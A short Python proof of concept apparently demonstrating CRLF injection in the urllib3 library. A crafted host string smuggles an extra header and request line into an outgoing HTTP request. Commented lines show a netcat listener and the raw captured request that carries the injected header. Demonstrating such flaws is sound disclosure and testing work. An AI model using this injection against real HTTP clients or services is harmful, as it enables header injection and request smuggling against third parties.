import urllib3

pool_manager = urllib3.PoolManager()

host = "?a=1 HTTP/1.1\r\nX-injected: header\r\nPOST localhost:8000/"
url = "http://" + host + ":8080/test/?test=a"

try:
    info = pool_manager.request('GET', url).info()
    print(info)
except Exception:
    pass

# nc -l localhost 7777
#GET /?a=1 HTTP/1.1
#X-injected: header
#TEST: 123:8080/test/?test=a HTTP/1.1
#Host: localhost:7777
#Accept-Encoding: identity